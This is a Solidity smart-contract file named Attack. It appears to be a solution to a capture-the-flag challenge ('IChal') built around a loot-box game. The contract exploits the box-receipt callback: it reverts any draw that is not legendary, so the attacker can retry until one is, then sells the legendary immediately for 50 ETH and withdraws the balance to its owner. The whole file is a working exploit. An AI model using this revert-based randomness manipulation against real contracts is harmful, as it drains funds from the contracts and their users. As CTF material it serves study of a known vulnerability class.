
 // SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IChal {
    function buyBox() external payable returns (uint256);
    function sellLegendary() external;
    function pals(address, uint8) external view returns (uint256);
    function LEGENDARY() external view returns (uint8);
}

contract Attack {
    IChal public immutable target;
    address public immutable owner;

    uint256 public legendaryCount;
    uint256 public totalReceived;

    event LegendaryReceived(uint256 indexed boxId);
    event LegendarySold(uint256 indexed boxId);

    constructor(address _target) {
        target = IChal(_target);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function buy() external payable onlyOwner {
        require(msg.value == 1 ether, "Need 1 ETH");
        target.buyBox{value: 1 ether}();
    }

    function onPalReceived(
        uint256 boxId,
        uint8 rarity
    ) external returns (bytes4) {
        require(msg.sender == address(target), "Invalid sender");

        // Only accept LEGENDARY = 3
        // Other results revert the entire backend transaction.
        require(rarity == 3, "Not legendary, retry");

        legendaryCount++;

        emit LegendaryReceived(boxId);

        // Sell the legendary for 50 ETH immediately.
        target.sellLegendary();

        emit LegendarySold(boxId);

        return this.onPalReceived.selector;
    }

    receive() external payable {
        // Keep this empty so Solidity transfer() can succeed.
    }

    function withdraw() external onlyOwner {
        (bool success, ) = payable(owner).call{
            value: address(this).balance
        }("");

        require(success, "Withdraw failed");
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

